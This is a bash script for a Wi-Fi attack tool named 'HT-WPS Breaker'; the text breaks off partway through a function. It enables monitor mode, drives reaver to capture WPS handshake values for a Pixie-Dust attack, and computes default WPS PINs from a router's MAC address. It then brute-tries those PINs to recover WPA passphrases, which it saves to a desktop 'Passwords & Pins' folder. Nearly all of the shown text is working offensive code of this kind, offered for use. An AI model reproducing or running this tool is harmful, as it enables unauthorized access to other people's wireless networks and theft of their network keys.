#!/bin/bash

# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

# Default
DefaultColor='\e[39m'   # Default foreground color

HT_FOLDER="HT-WPS-Breaker$(date "+%T" | tr -d ":")"
Temporary="/tmp/${HT_FOLDER}"

####################################################
########Verify the folder of Temporary files########
####################################################
   Ver_Dir=`ls /tmp | grep -E ^${HT_FOLDER}$`
   if [ "$Ver_Dir" != "" ];then
	    rm -rf ${Temporary}
	    mkdir ${Temporary}
   else
	    mkdir ${Temporary}
   fi
####################################################
#--------------------------------------------------#
####################################################
##############Verify Desktop Folder ################
####################################################
      if [ $(ls ~ | grep Desktop) != "" ] 
	      then
	          Desktop_PATH=~/Desktop
      elif [ $(ls ~ | grep Bureau) != "" ]
	      then
	          Desktop_PATH=~/Bureau
      else
	          Desktop_PATH=~
      fi
####################################################

RM_HT_FOLDER() {
echo ""
echo ""
echo ""
echo -e "$White [${Green} ok ${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X."
echo ""
echo -e "$White [${Red} !! ${White}] Remove any temporary file."
rm -rf ${Temporary}
sleep 1
echo ""
echo -e "$White [${Red} ++ ${White}]$Green Greetz to ${White}: ${Cyan}AKAS${White} &&${Cyan} Fantome195${White} ."
echo ""
exit
}
exit_function() {
echo ""
echo ""
echo ""
echo -e "$White [${Red}!$White] Remove any temporary file ."
rm -rf ${Temporary}
sleep 1
echo ""
if [ "$mode_monitor" == "active" ]
    then
        echo -e "$White [${Red}!${White}]$BRed Stop$White the ${Green}Monitor Mode$White."
        ifconfig $mon down && iwconfig $mon mode managed && ifconfig $mon up > /dev/null 2> /dev/null &
        echo ""
fi
echo -e "$White [+]$Green Greetz to : ${Cyan}AKAS${White} &&${Cyan} Fantome195${White} ."
echo -e "$DefaultColor"
exit
}
kill_wep_function() {
	                WEP_KILL=1
					Quit=1
					IVs=20000
					echo ""
	                echo -e "          ${Yellow}>>${White} The Cracking process has${Red} stoped${White} , G00D LuCk Next Time ."
	                echo -e "          ${Yellow}>>${White} Kill all processes running in${Red} background${White} ."
					echo ""
					echo -e "$White          [${Red}!${White}]$White Sorry password not found , good luck next time."
	                kill -9 $Airodump_PID 2> /dev/null
					kill -9 $arpreplay_PID 2> /dev/null
					kill -9 $aircrack_PID 2> /dev/null
					tset
					exit_function
}
kill_reaver() {
	                kill -9 $ReaverID 2> /dev/null
	                Quit=1
}
kill_wash() {
                    kill -9 $WashID 2> /dev/null
					Quit=1
}
kill_load() {
	                PID=$(($PID-1))
	                kill -9 $PID 2> /dev/null
}
kill_Hidden() {
	                Quit=1
	                echo ""
	                echo ""
	                echo -e "          ${Yellow}>>${White} The Cracking process has${Red} stoped${White} , G00D LuCk Next Time ."
	                echo -e "          ${Yellow}>>${White} Kill all processes running in${Red} background${White} ."
					echo ""
					echo -e "$White          [${Red}!${White}]$White Sorry Name not found , good luck next time ."
	                kill -9 $aireplayID 2> /dev/null
					kill -9 $Airodump_PID 2> /dev/null
					exit_function
}
arguments() {
						   echo "" > ${Temporary}/empty.txt
                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -e "$ESSID" -vvv -n -L -P -s ${Temporary}/empty.txt > ${Temporary}/Reaver.txt &
						   ReaverID=$!
						   disown $ReaverID
   						   e=`cat ${Temporary}/Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
                           r=`cat ${Temporary}/Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
                           s=`cat ${Temporary}/Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
                           z=`cat ${Temporary}/Reaver.txt | grep E-Hash2: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
                           a=`cat ${Temporary}/Reaver.txt | grep AuthKey: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
                           n=`cat ${Temporary}/Reaver.txt | grep E-Nonce: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
                           m=`cat ${Temporary}/Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
                           WPS=`cat ${Temporary}/Reaver.txt | grep 'WPS PIN'`
						   echo ""
						   echo -e "${White} +${Yellow}------------------------------${White}+"
						   echo -e "${Yellow} |${White} [${Red}+${White}]$Yellow all required arguments${Yellow}   |"
						   echo -e "${White} +${Yellow}------------------------------${White}+"
						   echo ""
						   v=0
						   Quit=0
						   while [ $v == 0 ] && [ $Quit == 0 ] #Reaver
						   do
						   n=`cat ${Temporary}/Reaver.txt | grep 'Trying pin' 2> /dev/null`
						   p=`cat ${Temporary}/Reaver.txt | wc -l 2> /dev/null`
						             if [ "$n" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
										       t=`cat ${Temporary}/Reaver.txt | sed -n $p'p' | cut -c 4- 2> /dev/null`
                           		               echo -ne "$White [+]$Green$t"
											   v=1
										   else
										       t=`cat ${Temporary}/Reaver.txt | sed -n $p'p' | cut -c 4- 2> /dev/null`
											   echo -ne "\r$White [+]$Red $t"
											   v=0
									 fi
						   done
						   BTN () {
						   	        if [ $Quit == 0 ]
						   	  	        then
						   	      	        echo ""
						   	      	        sleep 0.2
						   	     	        v=0
						   	        fi
						   }
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #E-Nonce
						   do
						   n=`cat ${Temporary}/Reaver.txt | grep E-Nonce: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
						             if [ "$n" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] E-Nonce: ${Green}$n"
											   v=1
										   else
											   echo -ne "\r$White [+] E-Nonce:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #PKE
						   do
						   e=`cat ${Temporary}/Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p 2> /dev/null` 
						             if [ "$e" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] PKE: ${Green}$e"
											   v=1
										   else
											   echo -ne "\r$White [+] PKE:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #R-Nonce
						   do
						   m=`cat ${Temporary}/Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
						             if [ "$m" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] R-Nonce: ${Green}$m"
											   v=1
										   else
											   echo -ne "\r$White [+] R-Nonce:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #PKR
						   do
						   r=`cat ${Temporary}/Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
						             if [ "$r" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] PKR: ${Green}$r"
											   v=1
										   else
											   echo -ne "\r$White [+] PKR:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #AuthKey
						   do
						   a=`cat ${Temporary}/Reaver.txt | grep AuthKey: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
						             if [ "$a" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] AuthKey: ${Green}$a"
											   v=1
										   else
											   echo -ne "\r$White [+] AuthKey:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #E-Hash1
						   do
						   s=`cat ${Temporary}/Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
						             if [ "$s" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] E-Hash1: ${Green}$s"
											   v=1
										   else
											   echo -ne "\r$White [+] E-Hash1:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #E-Hash2
						   do
						   z=`cat ${Temporary}/Reaver.txt | grep E-Hash2: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
						             if [ "$z" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] E-Hash2: ${Green}$z"
											   v=1
										   else
											   echo -ne "\r$White [+] E-Hash2:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   sleep 0.2
						   echo ""
						   echo ""
						   if [ "$BI" -eq "0" ]
						   		then
						   			echo -e "${White} +${Yellow}-------------------------------------------${White}+"
						   			echo -e "${Yellow} |${White} [${Red}+${White}]${Yellow} Information about Access Point (AP)   |"
						   			echo -e "${White} +${Yellow}-------------------------------------------${White}+"
						   			echo ""
						   			echo -e "$White [+] ESSID: $Green$ESSID"
				           			sleep 0.2
                           			echo -e "$White [+] BSSID: $Green$BSSID "
						   			sleep 0.2
                           			echo -e "$White [+] Channel: $Green$CHANNEL "
						   			sleep 0.2
						   			if [ "$menu" -ne 1 ]
						      			then
						          			echo -e "$White [+] Encryption:$Green $PRIVACY"
						          			sleep 0.2
						          			echo -e "$White [+] Speed:$Green$SPEED"
						   			fi
						   			Manufacturer=`cat ${Temporary}/Reaver.txt | grep Manufacturer: | cut -d' ' -f2- | sed  -n 1p 2> /dev/null`
						   			Model_Name=`cat ${Temporary}/Reaver.txt | grep Name: | cut -d' ' -f2- | sed -n 1p 2> /dev/null`
						   			Model_Number=`cat ${Temporary}/Reaver.txt | grep 'Model Number:' | cut -d' ' -f2- | sed -n 1p 2> /dev/null`
						   			Serial_Number=`cat ${Temporary}/Reaver.txt | grep 'Serial Number:' | cut -d' ' -f2- | sed -n 1p 2> /dev/null`
						   			echo -e "$White [+] $Manufacturer"
						   			sleep 0.2
						   			echo -e "$White [+] $Model_Name"
						   			sleep 0.2
						   			echo -e "$White [+] $Model_Number"
						   			sleep 0.2
						   			echo -e "$White [+] $Serial_Number"
						   			sleep 0.2
                           			echo ""
						   			sleep 0.2
						   fi
						   kill -9 $ReaverID 2> /dev/null
}
GENERATE_DEFAULT_PIN() {
						LAST_SIX_DIGITS=$(echo $MAC | awk -F":" '{print $4,$5,$6}' | tr -d " ")
						HEX_TO_DEC=$(printf '%d\n' 0x${LAST_SIX_DIGITS}) 2> /dev/null
						HALF_MAC=`expr '(' $HEX_TO_DEC '%' 10000000 ')'`   
						PIN=`expr 10 '*' $HALF_MAC`
						ACCUM=0                                                        
						ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`                                                          
						ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`                                            
						ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`                                                      
						ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
						ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
						ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
						ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
						THE_REST=`expr $ACCUM '%' 10`
						CHECK_THE_REST=`expr '(' 10 '-' $THE_REST ')' '%' 10`
						declare PIN$(echo $MAC | tr -d ":")[1]=$(printf '%08d\n' `expr $PIN '+' $CHECK_THE_REST`)
}
Try_Multi_PIN_REAVER() {
					Success=2
					PP=0
					TS1=""
					TS2=""
					TD=""
					if [ "${#ESSID}" -gt 5 ]
					then
						for (( TS=6;TS<=${#ESSID};TS++))
							do
								TS2=${TS2}' '
						done
						for (( TS=1;TS<=${#ESSID};TS++))
							do
								TD=${TD}-
						done
					else
						Nu_TS=$((5-${#ESSID}))
						for (( TS=1;TS<=${Nu_TS};TS++))
							do
								TS1=${TS1}' '
						done
						for (( TS=1;TS<=5;TS++))
							do
								TD=${TD}-
						done
					fi
					if [ "$MA" -lt "10" ]
						then
							ID="0$MA"
						else
							ID="$MA"
					fi
					echo ""
					echo -e "${White} +${Yellow}----${White}+${Yellow}--${TD}--${White}+${Yellow}---------------------${White}+"
					echo -e "${Yellow} |${Red} ID ${Yellow}|${Cyan}  ESSID${TS2}  ${Yellow}|${Green}  BSSID              ${Yellow}|"
					echo -e "${White} +${Yellow}----${White}+${Yellow}--${TD}--${White}+${Yellow}---------------------${White}+"
					echo -e "${Yellow} |${White} $ID ${Yellow}|${White}  $ESSID${TS1}  ${Yellow}|${White}  ${BSSID}  ${Yellow}|"
					echo -e "${White} +${Yellow}----${White}+${Yellow}--${TD}--${White}+${Yellow}---------------------${White}+"
					echo ""
					echo -e "${White} +${Yellow}----------------------------------${White}+"
					echo -e "${Yellow} |${White} [${Red}+${White}]$White Run${Red} Reaver${White} With Default PIN${Yellow}  |"
					echo -e "${White} +${Yellow}----------------------------------${White}+"
					echo ""
					while [ $Success == 2 ] && [ $PP -lt "$PIN_NUM" ]
						do
						   echo "" > ${Temporary}/empty.txt
						   if [ "$PIN_NUM" -gt 1 ]
						   		then
						   			PIN=`echo $((PIN$(echo $BSSID | tr -d ":")[$PP]))`
						   elif [ "$HHDP_GEN" -eq 1 ]
						   		then
						   			PP=$((PP+1))
						   else
						   			PIN=`echo $((PIN$(echo $BSSID | tr -d ":")[1]))`
						   			PP=$((PP+1))
						   fi
						   reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN -L -s -N -d 15 -T .5 -r 3:15 ${Temporary}/empty.txt > ${Temporary}/Get_Pass.txt &
						   ReaverID=$!
						   disown $ReaverID
						   sleep 1.0
						   Success=0
						   Quit=0
						   while [ $Success == 0 ] && [ $Quit == 0 ] #Reaver
						   		do
						   			p2_index=`cat ${Temporary}/Get_Pass.txt | grep 'p2_index set to' 2> /dev/null`
						   			Key=`cat ${Temporary}/Get_Pass.txt | grep -w "WPA PSK" | awk -F\' '{print $2}' 2> /dev/null`
						           	if [ "$p2_index" != "" ]
									    then
										    echo ""
										    echo -en "\033[1A\033[2K"
                           		            echo -ne "$White [+]$Red Bad ${White}PIN ."
											Success=2
									elif [ "$Key" != "" ]
										then
											echo ""
										    echo -en "\033[1A\033[2K"
											echo -e "$White [+] The process of${Green} Reaver${White} has completed${Green} successfully${White}."
											Success=1
									else
											echo -ne "\r$White [+] Running$Green Reaver$White with the following$Green PIN${Red} $PIN ${White}..."
											Success=0
									fi
									sleep 1.0
						   done
						   kill -9 $ReaverID 2> /dev/null
						   PP=$((PP+1))
					done
					if [ "$Key" != "" ]
						then
							echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
							echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
							echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
							echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
							echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
							echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
							echo ""
							echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
							echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
							echo -e "${White} [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL"
							echo -e "${White} [+]${Yellow} PIN        ${Red}>>${White} \"${Green}$PIN${White}\""
							echo -e "${White} [+]${Yellow} Key        ${Red}>>${White} \"${Green}$Key${White}\""
							echo -e "${White} [+]${Yellow} Date       ${Red}>>${White} $cr_date"
							echo ""
							echo -e "$White [${Yellow}+${White}]$Green Congratulation ${White}(${Red}^${White}_${Red}^${White}) "
							echo ""
					else
							echo ""
							echo ""
							echo ""
							echo -e "$White        [${Red}!${White}] Sorry Key not found , good luck next time ."
					fi
					ByPASS_Result=1
					echo ""
}
table() {
					max_s1=""
					max_s2=""
					max_sd=""
					if [ "${max_s}" -gt $Nm_s ]
					then
							for (( TS=$((Nm_s+1));TS<=${max_s};TS++))
								do
									max_s2=${max_s2}' '
							done
							for (( TS=1;TS<=${max_s};TS++))
								do
									max_sd=${max_sd}-
							done
					else
							Nu_TS=$((${Nm_s}-${max_s}))
							for (( TS=1;TS<=${Nu_TS};TS++))
								do
									max_s1=${max_s1}' '
							done
							for (( TS=1;TS<=5;TS++))
								do
									max_sd=${max_sd}-
							done
					fi
}
function Calc_Table() {
					SPC[$column]=""
					for (( A=0; A<$(($2-$1)); A++ ))
						do
							SPC[$column]=${SPC[$column]}' '
					done
}
function Calc_Table1() {
					SPCS[$column]=${SPCS[$column]}' '
					Dshs[$column]="-"
					for (( A=0; A<$(($2-$1)); A++ ))
						do
							SPCS[$column]=${SPCS[$column]}' '
							Dshs[$column]=${Dshs[$column]}"-"
					done
}
If_Print() {
					if [ "$If_Print_Num" -lt "10" ]
						then
							max_si3=""
							max_cs3=""
                     		for (( TS=${#Interface[$c]};TS<=${max_si};TS++))
                      			do
                       				max_si3=${max_si3}' '
                     		done
                     		for (( TS=$((${#Chipset[$c]}+1));TS<=${max_cs};TS++))
                      			do
                       				max_cs3=${max_cs3}' '
                     		done
                          		echo -e "${Yellow} |${White} 0$c${Yellow} |${White}  ${Interface[$c]}${max_si1}${max_si3}${Yellow} |${White}  ${Chipset[$c]}${max_cs1}${max_cs3}${Yellow} |"
                   else
                        		echo -e "${Yellow} |${White} $c${Yellow} |${White}  ${Interface[$c]}${max_si1}${max_si3}${Yellow} |${White}  ${Chipset[$c]}${max_cs1}${max_cs3}${Yellow} |"
                   fi
}
listInterfaces() {
	unset iface_list
	for iface in $(ls -1 /sys/class/net)
	do
		if [ -f /sys/class/net/${iface}/uevent ]; then
			if $(grep -q DEVTYPE=wlan /sys/class/net/${iface}/uevent)
			then
				iface_list="${iface_list}\n ${iface}"
			fi
		fi
	done
	if [ -x "$(command -v iwconfig 2>&1)" ] && [ -x "$(command -v sort 2>&1)" ]; then
		for iface in $(iwconfig 2> /dev/null | sed 's/^\([a-zA-Z0-9_.]*\) .*/\1/'); do
			iface_list="${iface_list}\n ${iface}"
		done
		iface_list="$(printf "${iface_list}" | sort -bu)"
	fi
}
getChipset() {
	#this needs cleanup, we shouldn't have multiple lines assigning chipset per bus
	#fix this to be one line per bus
	if [ -f /sys/class/net/$iface/device/modalias ]; then
		BUS="$(cut -d ":" -f 1 /sys/class/net/$iface/device/modalias)"
		if [ "$BUS" = "usb" ]; then
			if [ "${LSUSB}" = "1" ]; then
				BUSINFO="$(cut -d ":" -f 2 /sys/class/net/$iface/device/modalias | cut -b 1-10 | sed 's/^.//;s/p/:/')"
				CHIPSET="$(lsusb -d "$BUSINFO" | head -n1 - | cut -f3- -d ":" | sed 's/^....//;s/ Network Connection//g;s/ Wireless Adapter//g;s/^ //')"
			elif [ "${LSUSB}" = "0" ]; then
				printf "Your system doesn't seem to support usb but we found usb hardware, please report this.\n"
				exit 1
			fi
		#yes the below line looks insane, but broadcom appears to define all the internal buses so we have to detect them here
		elif [ "${BUS}" = "pci" -o "${BUS}" = "pcmcia" ] && [ "${LSPCI}" = "1" ]; then
			if [ -f /sys/class/net/$iface/device/vendor ] && [ -f /sys/class/net/$iface/device/device ]; then
				DEVICEID="$(cat /sys/class/net/$iface/device/vendor):$(cat /sys/class/net/$iface/device/device)"
				CHIPSET="$(lspci -d $DEVICEID | cut -f3- -d ":" | sed 's/Wireless LAN Controller //g;s/ Network Connection//g;s/ Wireless Adapter//;s/^ //')"
			else
				BUSINFO="$(printf "$ethtool_output" | grep bus-info | cut -d ":" -f "3-" | sed 's/^ //')"
				CHIPSET="$(lspci | grep "$BUSINFO" | head -n1 - | cut -f3- -d ":" | sed 's/Wireless LAN Controller //g;s/ Network Connection//g;s/ Wireless Adapter//;s/^ //')"
				DEVICEID="$(lspci -nn | grep "$BUSINFO" | grep '[[0-9][0-9][0-9][0-9]:[0-9][0-9][0-9][0-9]' -o)"
			fi
		elif [ "${BUS}" = "sdio" ]; then
			if [ -f /sys/class/net/$iface/device/vendor ] && [ -f /sys/class/net/$iface/device/device ]; then
				DEVICEID="$(cat /sys/class/net/$iface/device/vendor):$(cat /sys/class/net/$iface/device/device)"
			fi
			if [ "${DEVICEID}" = '0x02d0:0x4330' ]; then
				CHIPSET='Broadcom 4330'
			elif [ "${DEVICEID}" = '0x02d0:0x4329' ]; then
				CHIPSET='Broadcom 4329'
			elif [ "${DEVICEID}" = '0x02d0:0x4334' ]; then
				CHIPSET='Broadcom 4334'
			elif [ "${DEVICEID}" = '0x02d0:0xa94c' ]; then
				CHIPSET='Broadcom 43340'
			elif [ "${DEVICEID}" = '0x02d0:0xa94d' ]; then
				CHIPSET='Broadcom 43341'
			elif [ "${DEVICEID}" = '0x02d0:0x4324' ]; then
				CHIPSET='Broadcom 43241'
			elif [ "${DEVICEID}" = '0x02d0:0x4335' ]; then
				CHIPSET='Broadcom 4335/4339'
			elif [ "${DEVICEID}" = '0x02d0:0xa962' ]; then
				CHIPSET='Broadcom 43362'
			elif [ "${DEVICEID}" = '0x02d0:0xa9a6' ]; then
				CHIPSET='Broadcom 43430'
			elif [ "${DEVICEID}" = '0x02d0:0x4345' ]; then
				CHIPSET='Broadcom 43455'
			elif [ "${DEVICEID}" = '0x02d0:0x4354' ]; then
				CHIPSET='Broadcom 4354'
			elif [ "${DEVICEID}" = '0x02d0:0xa887' ]; then
				CHIPSET='Broadcom 43143'
			else
				CHIPSET="unable to detect for sdio $DEVICEID"
			fi
		else
			CHIPSET="Not pci, usb, or sdio"
		fi
	#we don't do a check for usb here but it is obviously only going to work for usb
	elif [ -f /sys/class/net/$iface/device/idVendor ] && [ -f /sys/class/net/$iface/device/idProduct ]; then
		DEVICEID="$(cat /sys/class/net/$iface/device/idVendor):$(cat /sys/class/net/$iface/device/idProduct)"
		if [ "${LSUSB}" = "1" ]; then
			CHIPSET="$(lsusb | grep -i "$DEVICEID" | head -n1 - | cut -f3- -d ":" | sed 's/^....//;s/ Network Connection//g;s/ Wireless Adapter//g;s/^ //')"
		elif [ "${LSUSB}" = "0" ]; then
			CHIPSET="idVendor and idProduct found on non-usb device, please report this."
		fi
	elif [ "${DRIVER}" = "mac80211_hwsim" ]; then
		CHIPSET="Software simulator of 802.11 radio(s) for mac80211"
	elif $(printf "$ethtool_output" | awk '/bus-info/ {print $2}' | grep -q bcma)
	then
		BUS="bcma"

		if [ "${DRIVER}" = "brcmsmac" ] || [ "${DRIVER}" = "brcmfmac" ] || [ "${DRIVER}" = "b43" ]; then
			CHIPSET="Broadcom on bcma bus, information limited"
		else
			CHIPSET="Unrecognized driver \"${DRIVER}\" on bcma bus"
		fi
	else
		CHIPSET="non-mac80211 device? (report this!)"
	fi
}
GET_INTERFACE_CHIPSET() {
							if [ -d /sys/bus/pci ] || [ -d /sys/bus/pci_express ] || [ -d /proc/bus/pci ]; then
					 			if [ ! -x "$(command -v lspci 2>&1)" ]; then
						 			printf "Please install lspci from your distro's package manager.\n"
						 			exit 1
					 			else
						 			LSPCI=1
					 			fi
							else
					 			LSPCI=0
				 			fi
				 			if [ -d /sys/bus/usb ]; then
					 			if [ ! -x "$(command -v lsusb 2>&1)" ]; then
						 			printf "Please install lsusb from your distro's package manager.\n"
						 			exit 1
					 			else
						 			LSUSB=1
					 			fi
				 			else
					 			LSUSB=0
				 			fi
							listInterfaces
							GIC=1
							for iface in $(printf "${iface_list}"); do
								unset ethtool_output DRIVER FROM FIRMWARE STACK MADWIFI MAC80211 BUS BUSADDR BUSINFO DEVICEID CHIPSET EXTENDED PHYDEV ifacet DRIVERt FIELD1 FIELD1t FIELD2 FIELD2t CHIPSETt
								#add a RUNNING check here and up the device if it isn't already
								ethtool_output="$(ethtool -i $iface 2>&1)"
								if [ "$ethtool_output" != "Cannot get driver information: Operation not supported" ]; then
									getChipset ${iface}
									INTERFACE[$GIC]="$iface"
									CHIPSET_VAR[$GIC]="$CHIPSET"
								else
 									printf "\nethtool failed...\n"
									printf "Only mac80211 devices on kernel 2.6.33 or higher are officially supported by airmon-ng.\n"
									exit 1
								fi
								GIC=$((GIC+1))
							done
}
Ver_Mon_WCar_Fun() {
                 echo ""
				 echo "[+] Scanning for wireless devices ..."
                 if [ $VerCar -ge 1 ] && [ "$VerMon" = "" ]
                      then
                      	   GET_INTERFACE_CHIPSET
                           NUM_INT_CHIP=1
                           Count_INT=0
                           max_si=0
                           max_cs=0
                      	   for (( c=1; c<${GIC}; c++))
       						    do
       						    	m[$c]=`iwconfig 2>&1 | grep "${INTERFACE[$c]}" | grep "ESSID" | awk '{print $1}'`
       						    	if [ "${m[$c]}" != "" ]
       						    		then
       						    			Count_INT=$((Count_INT+1))
       						    			Interface[$Count_INT]=${INTERFACE[$c]}
       						    			Chipset[$Count_INT]=${CHIPSET_VAR[$c]}
       						    			NUM_INT_CHIP=$((NUM_INT_CHIP+1))
       						    	fi
                           	        if [ "${#Chipset[$Count_INT]}" -gt "$max_cs" ]
                           	        	then
                           	        		max_cs=${#Chipset[$Count_INT]}
                           	        fi
                           	        if [ "${#Interface[$Count_INT]}" -gt "$max_si" ]
       						    		then
       						    			max_si=${#Interface[$Count_INT]}
       						    	fi
       					   done
       					   NUM_INT_CHIP=$((NUM_INT_CHIP-1))
       					   max_s=${max_cs}
       					   Nm_s=7
       					   table
       					   max_cs1=$max_s1
       					   max_cs2=$max_s2
       					   max_csd=$max_sd
       					   max_s=${max_si}
       					   Nm_s=9
       					   table
       					   max_si1=$max_s1
       					   max_si2=$max_s2
       					   max_sid=$max_sd
						   echo -e "[+] We found$Green ${NUM_INT_CHIP}$White wireless device(s)."
						   echo ""
						   max_si4=""
						   for (( TS=$((${#max_sid}+1));TS<=9;TS++))
						   		do
						   			max_si4=${max_si4}-
						   done
						   echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
						   echo -e "${Yellow} |${Red} ID${Yellow} |${Cyan}  Interface${max_si2}${Yellow}  |${Green}  Chipset${max_cs2}${Yellow} |"
						   echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
						   If_Print_Num="$NUM_INT_CHIP"
						   for (( c=1; c<=${Count_INT}; c++))
       						    do
	     						  If_Print
						   done
						   echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
						   echo ""
						   echo ""
						   V_number=0
						   while [ "$V_number" != "1" ]
								 do
								   echo -en "\033[1A\033[2K"
						           echo -e -n "${White}[+] Select$BRed number$White of wireless device to put into$Green monitor mode$White [${Green}1-${NUM_INT_CHIP}$White]:$Green"
						           read number
								   if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
									  then
								          if [ $number -ge 1 ] && [ $number -le "$NUM_INT_CHIP" ]; then
									          V_number=1
											  wlan=${Interface[$number]}
						   		          else
									          V_number=0
										  fi
								   else
								              V_number=0
								   fi
						   done
						   Wait_Msg="Enabling monitor mode on$Green $wlan $White."
						   End_Msg="${Green}Mode Monitor$White is enabled ."
						   trap kill_load SIGINT
						   ifconfig $wlan down && iwconfig $wlan mode monitor && ifconfig $wlan up > /dev/null 2> /dev/null &
						   PID="$!"
						   Loading
						   trap - SIGINT SIGQUIT SIGTSTP
                           mode_monitor="active"
                 elif [ "$VerCar" -le 0 ] && [ "$menu" -eq 6 ]
				        then
						    echo "" 
                            sleep 0.5
                            echo -e $White" [${Red}!${White}] Is no wireless device to put into${Green} monitor mode${White} ."
                            echo ""
                            sleep 0.5
                 elif [ $VerCar -le 0 ] && [ "$VerMon" = "" ]
                        then   
						    echo "" 
                            sleep 0.5
                            echo -e $White"     [${Red}!${White}] Wireless Card${Red} Not Found${White} ."
                            sleep 0.5
                 fi
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
}
Mode_Monitor_Print_Function() {
									GET_INTERFACE_CHIPSET
									NUM_INT_CHIP=1
									Count_INT=0
                           			max_si=0
                           			max_cs=0
                           			for (( c=1; c<${GIC}; c++))
       						            do
       						            	m[$c]=`iwconfig 2>&1 | grep "${INTERFACE[$c]}" | grep "Mode:Monitor" | awk '{print $1}'`
       						            	if [ "${m[$c]}" != "" ]
       						    				then
       						    					Count_INT=$((Count_INT+1))
       						    					Interface[$Count_INT]=${INTERFACE[$c]}
       						    					Chipset[$Count_INT]=${CHIPSET_VAR[$c]}
       						    					NUM_INT_CHIP=$((NUM_INT_CHIP+1))
       						    			fi
                           	        		if [ "${#Chipset[$Count_INT]}" -gt "$max_cs" ]
                           	        			then
                           	        				max_cs=${#Chipset[$Count_INT]}
                           	        		fi
                           	        		if [ "${#Interface[$Count_INT]}" -gt "$max_si" ]
       						    				then
